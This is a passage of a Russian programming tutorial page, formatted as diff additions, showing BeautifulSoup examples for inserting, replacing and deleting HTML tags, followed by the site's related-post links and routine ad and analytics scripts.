+ 
+
+    newtag = soup.new_tag('li')
+
+    newtag.string='OpenBSD'
+
+ 
+
+    ultag = soup.ul
+
+    
+
+    ultag.insert(2, newtag)
+
+    
+
+    print(ultag.prettify())</pre>
+</div>
+<p><span style="font-weight: 400;">В примере видно, как поставить тег </span><i><span style="font-weight: 400;">li</span></i><span style="font-weight: 400;"> на третью позицию в выбранном </span><i><span style="font-weight: 400;">ul</span></i><span style="font-weight: 400;"> теге.</span></p>
+<h2 id="ispolzovanie-metoda-replace_with-dlya-zameny"><span style="font-weight: 400;">Использование метода </span><i><span style="font-weight: 400;">replace_with()</span></i><span style="font-weight: 400;"> для замены текста в теге</span></h2>
+<p><span style="font-weight: 400;">Если необходимо заменить содержимое определенного элемента, используется метод </span><i><span style="font-weight: 400;">replace_with()</span></i><span style="font-weight: 400;">.  </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">#!/usr/bin/python3
+
+ 
+
+from bs4 import BeautifulSoup
+
+ 
+
+with open("index.html", "r") as f:
+
+    
+
+    contents = f.read()
+
+ 
+
+    soup = BeautifulSoup(contents, 'lxml')
+
+ 
+
+    tag = soup.find(text="Windows")
+
+    tag.replace_with("OpenBSD")
+
+    
+
+    print(soup.ul.prettify())</pre>
+</div>
+<p><span style="font-weight: 400;">В этом примере видно, как с помощью метода </span><i><span style="font-weight: 400;">find()</span></i><span style="font-weight: 400;"> можно найти определенный элемент, а затем, с помощью метода </span><i><span style="font-weight: 400;">replace_with()</span></i><span style="font-weight: 400;"> заменить его содержимое.</span></p>
+<h2 id="ispolzovanie-metoda-decompose-dlya-udaleniya"><span style="font-weight: 400;">Использование метода </span><i><span style="font-weight: 400;">decompose()</span></i><span style="font-weight: 400;"> для удаления HTML-тега</span></h2>
+<p><span style="font-weight: 400;">А вот с помощью метода </span><i><span style="font-weight: 400;">decompose()</span></i><span style="font-weight: 400;"> можно убрать определенный тег из документа. Работает это следующим образом. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">#!/usr/bin/python3
+
+ 
+
+from bs4 import BeautifulSoup
+
+ 
+
+with open("index.html", "r") as f:
+
+    
+
+    contents = f.read()
+
+ 
+
+    soup = BeautifulSoup(contents, 'lxml')
+
+ 
+
+    ptag2 = soup.select_one("p:nth-of-type(2)")
+
+     
+
+    ptag2.decompose()
+
+    
+
+    print(soup.body.prettify())</pre>
+</div>
+<p><span style="font-weight: 400;">Здесь видно, как удалить второй элемент </span><i><span style="font-weight: 400;">p</span></i><span style="font-weight: 400;"> в документе.</span></p>
+<div class="flat_pm_end"></div>
+<div class="likebtn_container" style="text-align:center;">Оцените качество статьи. Нам важно ваше мнение: </br><!-- LikeBtn.com BEGIN --><span class="likebtn-wrapper"  data-identifier="post_23642"  data-site_id="5b48cf196fd08b5836c93b0b"  data-theme="nero"  data-lang="ru"  data-rich_snippet="true"  data-i18n_like="Полезная статья"  data-i18n_dislike="Не нашел ответа"  data-style=""  data-unlike_allowed=""  data-show_copyright=""  data-item_url="https://office-guru.ru/python-onlajn-kurs/uroki/beautifulsoup-parsing-html-v-python-na-primerax.html"  data-item_title="BeautifulSoup – парсинг HTML в Python на примерах"  data-item_image="https://office-guru.ru/wp-content/uploads/2022/01/e453ad80-abde-11ea-93df-fe0442095c6d-1024x590.jpeg"  data-item_date="2022-01-11T14:28:57+03:00"  data-engine="WordPress"  data-plugin_v="2.6.45"  data-prx="https://office-guru.ru/wp-admin/admin-ajax.php?action=likebtn_prx"  data-event_handler="likebtn_eh" ></span><!-- LikeBtn.com END --></div><!-- AI CONTENT END 2 -->
+    </div><!-- .entry-content -->
+
+</article>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta itemscope itemprop="mainEntityOfPage" itemType="https://schema.org/WebPage" itemid="https://office-guru.ru/python-onlajn-kurs/uroki/beautifulsoup-parsing-html-v-python-na-primerax.html" content="BeautifulSoup – парсинг HTML в Python на примерах">
+    <meta itemprop="dateModified" content="2022-01-11">
+<div itemprop="publisher" itemscope itemtype="https://schema.org/Organization" style="display: none;"><div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><img itemprop="url image" src="https://office-guru.ru/wp-content/uploads/2021/08/1936905_computer_device_mac_pc_work_icon-1.png" alt="ОфисГуру "></div><meta itemprop="name" content="ОфисГуру "><meta itemprop="telephone" content="ОфисГуру "><meta itemprop="address" content="https://office-guru.ru"></div>
+            </main><!-- #main -->
+        </div><!-- #primary -->
+
+        
+<aside id="secondary" class="widget-area" itemscope itemtype="http://schema.org/WPSideBar">
+    <div class="sticky-sidebar js-sticky-sidebar">
+
+        
+        <div id="custom_html-21" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget">Подпишитесь к нам в дзен-канал, для получения свежих новостей  it мира:
+<a href="https://zen.yandex.ru/office-guru.ru" target="_blank" rel="noopener"><img class="alignnone size-full wp-image-30541" src="https://office-guru.ru/wp-content/uploads/2022/05/Screenshot_10-e1627581592890.jpg" alt="" width="275" height="112" /></a></div></div><div id="custom_html-17" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><!-- Yandex.RTB R-A-279152-18 -->
+<div id="yandex_rtb_R-A-279152-18"></div>
+<script>window.yaContextCb.push(()=>{
+  Ya.Context.AdvManager.render({
+    renderTo: 'yandex_rtb_R-A-279152-18',
+    blockId: 'R-A-279152-18'
+  })
+})</script></div></div>
+        
+    </div>
+</aside><!-- #secondary -->
+
+    
+    <div id="related-posts" class="related-posts fixed"><div class="related-posts__header">Вам также может понравиться</div><div class="post-cards post-cards--vertical">
+<div class="post-card post-card--related">
+    <div class="post-card__thumbnail"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/funkciya-range-v-python.html"><img width="335" height="220" src="https://office-guru.ru/wp-content/uploads/2022/02/3х4адз43да-335x220.jpeg" class="attachment-reboot_small size-reboot_small wp-post-image" alt="Функция range () в Python 3 - Полное руководство" loading="lazy" /></a></div><div class="post-card__title"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/funkciya-range-v-python.html">Функция range () в Python</a></div><div class="post-card__description">Python имеет собственную встроенную функцию, которая</div>
+</div>
+
+<div class="post-card post-card--related">
+    <div class="post-card__thumbnail"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/perevernut-stroku-v-python.html"><img width="335" height="220" src="https://office-guru.ru/wp-content/uploads/2022/02/ъахжъ3хаж-335x220.jpeg" class="attachment-reboot_small size-reboot_small wp-post-image" alt="Способы перевернуть строку в Python - reversed ()" loading="lazy" /></a></div><div class="post-card__title"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/perevernut-stroku-v-python.html">Перевернуть строку в Python</a></div><div class="post-card__description">Python предлагает широкий ассортимент возможностей</div>
+</div>
+
+<div class="post-card post-card--related">
+    <div class="post-card__thumbnail"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/json-v-python-chast-2.html"><img width="335" height="220" src="https://office-guru.ru/wp-content/uploads/2022/02/3хз4ад4х3зда-335x220.jpeg" class="attachment-reboot_small size-reboot_small wp-post-image" alt="JSON в Python - примеры работы модуля JSON (Часть 2)" loading="lazy" /></a></div><div class="post-card__title"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/json-v-python-chast-2.html">JSON в Python (Часть 2)</a></div><div class="post-card__description">В предыдущей части этой статьи мы разобрали основные</div>
+</div>
+
+<div class="post-card post-card--related">
+    <div class="post-card__thumbnail"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/json-v-python-chast-1.html"><img width="335" height="220" src="https://office-guru.ru/wp-content/uploads/2022/02/3х4задх34д-335x220.jpeg" class="attachment-reboot_small size-reboot_small wp-post-image" alt="JSON в Python (Часть 1)" loading="lazy" /></a></div><div class="post-card__title"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/json-v-python-chast-1.html">JSON в Python (Часть 1)</a></div><div class="post-card__description">Обмен данными – важный компонент любого языка программирования.</div>
+</div>
+
+<div class="post-card post-card--related">
+    <div class="post-card__thumbnail"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/mnozhestva-v-python-set-primery.html"><img width="335" height="220" src="https://office-guru.ru/wp-content/uploads/2022/02/пшщ3ощпшо-335x220.jpeg" class="attachment-reboot_small size-reboot_small wp-post-image" alt="Множества в Python. Подробный справочник Set" loading="lazy" /></a></div><div class="post-card__title"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/mnozhestva-v-python-set-primery.html">Множества в Python set () Примеры</a></div><div class="post-card__description">Множества в Python – это один из самых интересных компонентов</div>
+</div>
+
+<div class="post-card post-card--related">
+    <div class="post-card__thumbnail"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/flask-ili-django-vybiraem-python-vebfrejmvork.html"><img width="335" height="220" src="https://office-guru.ru/wp-content/uploads/2022/02/3хздах3д4-335x220.jpeg" class="attachment-reboot_small size-reboot_small wp-post-image" alt="Flask против Django. Какой вебфреймворк выбрать?" loading="lazy" /></a></div><div class="post-card__title"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/flask-ili-django-vybiraem-python-vebfrejmvork.html">Flask или Django? Выбираем Python вебфреймворк</a></div><div class="post-card__description">Django и Flask, безусловно, самые популярные фреймворки</div>
+</div>
+
+<div class="post-card post-card--related">
+    <div class="post-card__thumbnail"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/obrabotka-izobrazhenij-na-aws-lambda-i-api-gateway-za-10-minut.html"><img width="335" height="220" src="https://office-guru.ru/wp-content/uploads/2022/02/1_L28ihnevjQK9O2U_vBgaHA-335x220.png" class="attachment-reboot_small size-reboot_small wp-post-image" alt="Amazon: AWS Lambda и API Gateway с примерами Python" loading="lazy" /></a></div><div class="post-card__title"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/obrabotka-izobrazhenij-na-aws-lambda-i-api-gateway-za-10-minut.html">Обработка изображений на AWS Lambda и API Gateway за 10 минут</a></div><div class="post-card__description">Давайте попробуем создать программу на Python 3.</div>
+</div>
+
+<div class="post-card post-card--related">
+    <div class="post-card__thumbnail"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/data-science-8-glavnyx-bibliotek-dlya-python-programmista.html"><img width="335" height="220" src="https://office-guru.ru/wp-content/uploads/2022/02/3х4зад3хз4да-335x220.jpeg" class="attachment-reboot_small size-reboot_small wp-post-image" alt="Data Science - машинное обучение с нуля на Python" loading="lazy" /></a></div><div class="post-card__title"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/data-science-8-glavnyx-bibliotek-dlya-python-programmista.html">Data Science &#8212; 8 главных библиотек для Python программиста</a></div><div class="post-card__description">Data Science становится все более популярным направлением</div>
+</div>
+
+<div class="post-card post-card--related">
+    <div class="post-card__thumbnail"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/kak-sdelat-okno-vyvoda-logov-v-wx-textctrl-wxpython.html"><img width="335" height="220" src="https://office-guru.ru/wp-content/uploads/2022/02/х3ах4а-335x220.jpeg" class="attachment-reboot_small size-reboot_small wp-post-image" alt="Как сделать окно вывода логов в wx.TextCtrl" loading="lazy" /></a></div><div class="post-card__title"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/kak-sdelat-okno-vyvoda-logov-v-wx-textctrl-wxpython.html">Как сделать окно вывода логов в wx.TextCtrl &#8212; wxPython</a></div><div class="post-card__description">Делая графическую обертку для какого-то инструмента</div>
+</div>
+
+<div class="post-card post-card--related">
+    <div class="post-card__thumbnail"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/kak-proverit-sushhestvuet-li-fajl-pri-pomoshhi-python.html"><img width="335" height="220" src="https://office-guru.ru/wp-content/uploads/2022/01/3-335x220.jpeg" class="attachment-reboot_small size-reboot_small wp-post-image" alt="Существует ли файл в Python, примеры os.path.exists() и os.path.isfile()" loading="lazy" /></a></div><div class="post-card__title"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/kak-proverit-sushhestvuet-li-fajl-pri-pomoshhi-python.html">Как проверить, существует ли файл, при помощи Python</a></div><div class="post-card__description">Работа с файлами – неотъемлемая составляющая взаимодействия</div>
+</div>
+
+<div class="post-card post-card--related">
+    <div class="post-card__thumbnail"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/rukovodstvo-po-sozdaniyu-poiska-na-sajte-v-django.html"><img width="335" height="220" src="https://office-guru.ru/wp-content/uploads/2022/01/2-335x220.jpeg" class="attachment-reboot_small size-reboot_small wp-post-image" alt="Создание и настройка поиска на сайте в Джанго (Django Framework)" loading="lazy" /></a></div><div class="post-card__title"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/rukovodstvo-po-sozdaniyu-poiska-na-sajte-v-django.html">Руководство по созданию поиска на сайте в Django</a></div><div class="post-card__description">Сегодня мы рассмотрим базовые аспекты, связанные с</div>
+</div>
+
+<div class="post-card post-card--related">
+    <div class="post-card__thumbnail"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/python-traceback-kak-pravilno-ispravlyat-oshibki-v-kode.html"><img width="335" height="220" src="https://office-guru.ru/wp-content/uploads/2022/01/1-335x220.jpeg" class="attachment-reboot_small size-reboot_small wp-post-image" alt="Изучаем трассировку из Python на примерах решения проблем в коде" loading="lazy" /></a></div><div class="post-card__title"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/python-traceback-kak-pravilno-ispravlyat-oshibki-v-kode.html">Python Traceback &#8212; Как правильно исправлять ошибки в коде</a></div><div class="post-card__description">Трассировка (traceback) – это вывод Python.</div>
+</div>
+
+<div class="post-card post-card--related">
+    <div class="post-card__thumbnail"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/zagruzka-fajlov-v-django.html"><img width="335" height="220" src="https://office-guru.ru/wp-content/uploads/2022/01/Ckj_NdaWUAEn-7Y-1-335x220.jpeg" class="attachment-reboot_small size-reboot_small wp-post-image" alt="Django - пример загрузки файла на сервер используя Джанго" loading="lazy" /></a></div><div class="post-card__title"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/zagruzka-fajlov-v-django.html">Загрузка файлов в Django</a></div><div class="post-card__description">Сегодня поговорим о том, как реализовывается загрузка</div>
+</div>
+
+<div class="post-card post-card--related">
+    <div class="post-card__thumbnail"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/pymysql-instrukciya-po-ispolzovaniyu-mysql-na-primerax.html"><img width="335" height="220" src="https://office-guru.ru/wp-content/uploads/2022/01/Python-dostup-k-baze-dannyh-MySQL-335x220.png" class="attachment-reboot_small size-reboot_small wp-post-image" alt="Примеры работы с MySQL в Python при помощи модуля PyMySQL" loading="lazy" /></a></div><div class="post-card__title"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/pymysql-instrukciya-po-ispolzovaniyu-mysql-na-primerax.html">PyMySQL — инструкция по использованию MySQL на примерах</a></div><div class="post-card__description">Сегодня поговорим о том, как воспользоваться PyMySQL</div>
+</div>
+
+<div class="post-card post-card--related">
+    <div class="post-card__thumbnail"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/dekorator-s-argumentami-v-python.html"><img width="335" height="220" src="https://office-guru.ru/wp-content/uploads/2022/01/Decoratorwithoutparameter-335x220.jpeg" class="attachment-reboot_small size-reboot_small wp-post-image" alt="Примеры использования декоратора с аргументами в Python" loading="lazy" /></a></div><div class="post-card__title"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/dekorator-s-argumentami-v-python.html">Декоратор с аргументами в Python</a></div><div class="post-card__description">Сегодня приведем небольшой пример создания функции</div>
+</div>
+
+<div class="post-card post-card--related">
+    <div class="post-card__thumbnail"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/requests-v-python-primery-vypolneniya-http-zaprosov-chast-2.html"><img width="335" height="220" src="https://office-guru.ru/wp-content/uploads/2022/01/3эжуад3-335x220.jpeg" class="attachment-reboot_small size-reboot_small wp-post-image" alt="Requests - POST, GET, AUTH на примерах, ConnectionRrror, Session (Часть 2)" loading="lazy" /></a></div><div class="post-card__title"><a href="https://office-guru.ru/python-onlajn-kurs/uroki/requests-v-python-primery-vypolneniya-http-zaprosov-chast-2.html">Requests в Python &#8212; Примеры выполнения HTTP запросов (Часть 2)</a></div><div class="post-card__description">Продолжаем рассматривать HTTP-запросы в Python и то</div>
+</div>
+</div></div>
+
+</div><!--.site-content-inner-->
+
+
+</div><!--.site-content-->
+
+
+
+
+
+<div class="site-footer-container ">
+
+    
+
+    <footer id="colophon" class="site-footer site-footer--style-gray full">
+        <div class="site-footer-inner fixed">
+
+            
+            
+<div class="footer-bottom">
+    <div class="footer-info">
+        © 2022 ОфисГуру Ньюс <br>
+Новости и статьи про новые технологии, гаджеты, IT, инновации, уроки по Excel<br>
+При использовании материалов сайта ссылка обязательна
+	        </div>
+
+    </div>
+        </div>
+    </footer><!--.site-footer-->
+</div>
+
+
+    <button type="button" class="scrolltop js-scrolltop"></button>
+
+</div><!-- #page -->
+
+    <!-- LikeBtn.com BEGIN -->
+    <script type="text/javascript">var likebtn_wl = 1; (function(d, e, s) {a = d.createElement(e);m = d.getElementsByTagName(e)[0];a.async = 1;a.src = s;m.parentNode.insertBefore(a, m)})(document, 'script', '//w.likebtn.com/js/w/widget.js'); if (typeof(LikeBtn) != "undefined") { LikeBtn.init(); }</script>
+    <!-- LikeBtn.com END -->
+            
+<div class='code-block code-block-6' style='margin: 8px 0; clear: both;'>
+<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="0"><div class="su-expand-content su-u-trim" style="color:#333333;max-height:0px;overflow:hidden">
+<!-- BEGIN Otclick Banner poznanie21 300х250 (banner)-->
+<div id="_mt_ot_container_6583"></div>
+<script language="JavaScript">
+<!--
+(function(w){
+var wd = w.document;
+w._mt_rnd = w._mt_rnd || Math.floor(Math.random() * 1000000);
+w._mt_referrer = w._mt_referrer || escape(wd.referrer || '');
+try { w._mt_location = w._mt_location || escape(w.top.location.href) }
+catch (e) { w._mt_location = escape(w.location.href) }
+w._MT_jsLoadDelayed = function(b,c,d){var a=wd.createElement("script");
+d&&(a.id=d);a.language="javascript";a.type="text/javascript";a.charset="utf-8";a.async=1;
+a.src=b;if(w.ActiveXObject){var e=!1;a.onload=a.onreadystatechange=function(){
+if(!e&&(!this.readyState||this.readyState==="complete"||this.readyState==="loaded"&&
+this.nextSibling!=null)){e=true;c&&c();a.onload=a.onreadystatechange=null}}}else
+a.onload=c;b=wd.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b)};
+w._MT_jsLoadDelayed('//otclick-adv.ru/core/code.js?pid=6583&rid=' + w._mt_rnd + '&rl=' +
+w._mt_referrer + '&ll=' + w._mt_location + '&ow=' + w.outerWidth + '&oh=' + w.outerHeight +
+'&sw=' + w.screen.width + '&sh=' + w.screen.height + '&pd=' + w.screen.pixelDepth + '&f=' +
+(w.top == w ? 0 : 1));
+})(window)
+// -->
+</script>
+<!-- END Otclick Banner -->
+
+</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">.</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">..</span></a></div></div></div>
+<script>var pseudo_links = document.querySelectorAll(".pseudo-clearfy-link");for (var i=0;i<pseudo_links.length;i++ ) { pseudo_links[i].addEventListener("click", function(e){   window.open( e.target.getAttribute("data-uri") ); }); }</script><script>document.addEventListener("copy", (event) => {var pagelink = "\nИсточник: https://office-guru.ru/python-onlajn-kurs/uroki/beautifulsoup-parsing-html-v-python-na-primerax.html";event.clipboardData.setData("text", document.getSelection() + pagelink);event.preventDefault();});</script><!-- Rating Mail.ru counter -->
+<script type="text/javascript">
+var _tmr = window._tmr || (window._tmr = []);
+_tmr.push({id: "3145625", type: "pageView", start: (new Date()).getTime()});
+(function (d, w, id) {
+  if (d.getElementById(id)) return;
+  var ts = d.createElement("script"); ts.type = "text/javascript"; ts.async = true; ts.id = id;
+  ts.src = "https://top-fwz1.mail.ru/js/code.js";
+  var f = function () {var s = d.getElementsByTagName("script")[0]; s.parentNode.insertBefore(ts, s);};
+  if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); }
+})(document, window, "topmailru-code");
+</script><noscript><div>
+<img src="https://top-fwz1.mail.ru/counter?id=3145625;js=na" style="border:0;position:absolute;left:-9999px;" alt="Top.Mail.Ru" />
+</div></noscript>
+<!-- //Rating Mail.ru counter -->
+<script async src="//files.jumpoutpopup.ru/aa2a8b53fdc42c3962f3.js"></script><link rel='stylesheet' id='su-icons-css'  href='https://office-guru.ru/wp-content/plugins/shortcodes-ultimate/includes/css/icons.css'  media='all' />
+<link rel='stylesheet' id='su-shortcodes-css'  href='https://office-guru.ru/wp-content/plugins/shortcodes-ultimate/includes/css/shortcodes.css'  media='all' />
+<script  src='https://office-guru.ru/wp-content/plugins/wp-codemirror-block/vendor/codemirror/lib/codemirror.min.js' id='codemirror-js'></script>
+<script  id='codemirror-autoload-assets-js-before'>
+var wpcm = {"plugin_url":"https://office-guru.ru/wp-content/plugins/wp-codemirror-block","assets":[],"panelOptions":{"showPanel":true,"languageLabel":"language","runButton":true,"fullScreenButton":true,"copyButton":true},"view":"public"}
+</script>
+<script  src='https://office-guru.ru/wp-content/plugins/wp-codemirror-block/assets/js/autoLoadAssets.min.js' id='codemirror-autoload-assets-js'></script>
+<script  src='https://office-guru.ru/wp-content/plugins/wp-codemirror-block/assets/js/init.min.js' id='codemirror-init-js'></script>
+<script type='text/javascript' id='reboot-scripts-js-extra'>
+/* <![CDATA[ */
+var settings_array = {"rating_text_average":"\u0441\u0440\u0435\u0434\u043d\u0435\u0435","rating_text_from":"\u0438\u0437","lightbox_display":"1","sidebar_fixed":"1"};
+var wps_ajax = {"url":"https:\/\/office-guru.ru\/wp-admin\/admin-ajax.php","nonce":"6ce495104d"};
+/* ]]> */
+</script>
+<script  src='https://office-guru.ru/wp-content/themes/reboot/assets/js/scripts.min.js' id='reboot-scripts-js'></script>
+<script  src='https://office-guru.ru/wp-includes/js/comment-reply.min.js' id='comment-reply-js'></script>
+<script type='text/javascript' id='q2w3_fixed_widget-js-extra'>
+/* <![CDATA[ */
+var q2w3_sidebar_options = [{"sidebar":"sidebar-1","use_sticky_position":false,"margin_top":0,"margin_bottom":0,"stop_elements_selectors":"","screen_max_width":0,"screen_max_height":0,"widgets":["#custom_html-17"]}];
+/* ]]> */
+</script>
+<script  src='https://office-guru.ru/wp-content/plugins/q2w3-fixed-widget/js/frontend.min.js' id='q2w3_fixed_widget-js'></script>
+<script type='text/javascript' id='su-shortcodes-js-extra'>
+/* <![CDATA[ */
+var SUShortcodesL10n = {"noPreview":"\u042d\u0442\u043e\u0442 \u0448\u043e\u0440\u0442\u043a\u043e\u0434 \u043d\u0435 \u0440\u0430\u0431\u043e\u0442\u0430\u0435\u0442 \u0432 \u0440\u0435\u0436\u0438\u043c\u0435 \u043f\u0440\u0435\u0434\u043f\u0440\u043e\u0441\u043c\u043e\u0442\u0440\u0430. \u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430 \u0432\u0441\u0442\u0430\u0432\u044c\u0442\u0435 \u0448\u043e\u0440\u0442\u043a\u043e\u0434 \u0432 \u0440\u0435\u0434\u0430\u043a\u0442\u043e\u0440 \u0438 \u043f\u043e\u0441\u043c\u043e\u0442\u0440\u0438\u0442\u0435 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442 \u043d\u0430 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0435 \u0437\u0430\u043f\u0438\u0441\u0438.","magnificPopup":{"close":"\u0417\u0430\u043a\u0440\u044b\u0442\u044c (Esc)","loading":"\u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430...","prev":"\u041d\u0430\u0437\u0430\u0434 (\u041a\u043b\u0430\u0432\u0438\u0448\u0430 \u0412\u043b\u0435\u0432\u043e)","next":"\u0412\u043f\u0435\u0440\u0435\u0434 (\u041a\u043b\u0430\u0432\u0438\u0448\u0430 \u0412\u043f\u0440\u0430\u0432\u043e)","counter":"%curr% \u0438\u0437 %total%","error":"Failed to load content. <a href=\"%url%\" target=\"_blank\"><u>Open link<\/u><\/a>"}};
+/* ]]> */
+</script>
+<script  src='https://office-guru.ru/wp-content/plugins/shortcodes-ultimate/includes/js/shortcodes/index.js' id='su-shortcodes-js'></script>
+<script>
+function b2a(a){var b,c=0,l=0,f="",g=[];if(!a)return a;do{var e=a.charCodeAt(c++);var h=a.charCodeAt(c++);var k=a.charCodeAt(c++);var d=e<<16|h<<8|k;e=63&d>>18;h=63&d>>12;k=63&d>>6;d&=63;g[l++]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(e)+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(h)+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(k)+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(d)}while(c<
+a.length);return f=g.join(""),b=a.length%3,(b?f.slice(0,b-3):f)+"===".slice(b||3)}function a2b(a){var b,c,l,f={},g=0,e=0,h="",k=String.fromCharCode,d=a.length;for(b=0;64>b;b++)f["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt(b)]=b;for(c=0;d>c;c++)for(b=f[a.charAt(c)],g=(g<<6)+b,e+=6;8<=e;)((l=255&g>>>(e-=8))||d-2>c)&&(h+=k(l));return h}b64e=function(a){return btoa(encodeURIComponent(a).replace(/%([0-9A-F]{2})/g,function(b,a){return String.fromCharCode("0x"+a)}))};
+b64d=function(a){return decodeURIComponent(atob(a).split("").map(function(a){return"%"+("00"+a.charCodeAt(0).toString(16)).slice(-2)}).join(""))};
+/* <![CDATA[ */
+ai_front = {"insertion_before":"\u041f\u0415\u0420\u0415\u0414","insertion_after":"\u041f\u041e\u0421\u041b\u0415","insertion_prepend":"PREPEND CONTENT","insertion_append":"\u0414\u041e\u0411\u0410\u0412\u042c\u0422\u0415 \u0421\u041e\u0414\u0415\u0420\u0416\u0418\u041c\u041e\u0415","insertion_replace_content":"\u0417\u0410\u041c\u0415\u041d\u0418\u0422\u0415 \u041a\u041e\u041d\u0422\u0415\u041d\u0422","insertion_replace_element":"\u0417\u0410\u041c\u0415\u041d\u0418\u0422\u0415 \u042d\u041b\u0415\u041c\u0415\u041d\u0422","visible":"\u0412\u0418\u0414\u0418\u041c\u042b\u0419","hidden":"\u0421\u041a\u0420\u042b\u0422","fallback":"FALLBACK","automatically_placed":"\u0410\u0432\u0442\u043e\u043c\u0430\u0442\u0438\u0447\u0435\u0441\u043a\u0438 \u043f\u043e\u043c\u0435\u0449\u0430\u0435\u0442\u0441\u044f \u0441 \u043f\u043e\u043c\u043e\u0449\u044c\u044e \u043a\u043e\u0434\u0430 AdSense Auto","cancel":"\u041e\u0442\u043c\u0435\u043d\u0430","use":"\u0418\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c","add":"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c","parent":"\u0420\u043e\u0434\u0438\u0442\u0435\u043b\u044c","cancel_element_selection":"\u041e\u0442\u043c\u0435\u043d\u0438\u0442\u044c \u0432\u044b\u0431\u043e\u0440 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430","select_parent_element":"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0440\u043e\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u043a\u0438\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442","css_selector":"CSS \u0441\u0435\u043b\u0435\u043a\u0442\u043e\u0440","use_current_selector":"\u0418\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u0442\u0435\u043a\u0443\u0449\u0438\u0439 \u0441\u0435\u043b\u0435\u043a\u0442\u043e\u0440","element":"\u042d\u041b\u0415\u041c\u0415\u041d\u0422","path":"\u041f\u0423\u0422\u042c","selector":"\u0421\u0415\u041b\u0415\u041a\u0422\u041e\u0420"};
+/* ]]> */
+function ai_run_scripts(){(function(a){if("function"===typeof define&&define.amd){define(a);var c=!0}"object"===typeof exports&&(module.exports=a(),c=!0);if(!c){var d=window.Cookies,b=window.Cookies=a();b.noConflict=function(){window.Cookies=d;return b}}})(function(){function a(){for(var d=0,b={};d<arguments.length;d++){var f=arguments[d],e;for(e in f)b[e]=f[e]}return b}function c(d){function b(){}function f(h,k,g){if("undefined"!==typeof document){g=a({path:"/",sameSite:"Lax"},b.defaults,g);"number"===typeof g.expires&&(g.expires=
